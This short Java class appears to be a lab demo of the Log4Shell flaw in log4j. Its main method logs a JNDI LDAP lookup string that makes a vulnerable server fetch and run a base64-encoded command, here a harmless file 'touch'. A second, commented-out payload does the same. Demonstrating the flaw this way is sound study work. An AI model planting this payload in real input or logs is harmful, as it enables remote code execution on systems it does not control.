package com.tetlow.basic;

import org.apache.log4j.Logger;
import org.apache.log4j.LogManager;
 
public class BasicLogger {
   static Logger logger = LogManager.getLogger(BasicLogger.class);
 
   public static void main(String... args) {
      System.out.println("Main says, 'Hello, world.'");
      //logger.error(args.length > 0 ? args[0] : "[no data provided to log]");
      logger.error("${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}");
      // logger.error("${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/ZWNobyAiSGVsbG8iCg=}");
      System.out.println("Main is exiting.");
   }
}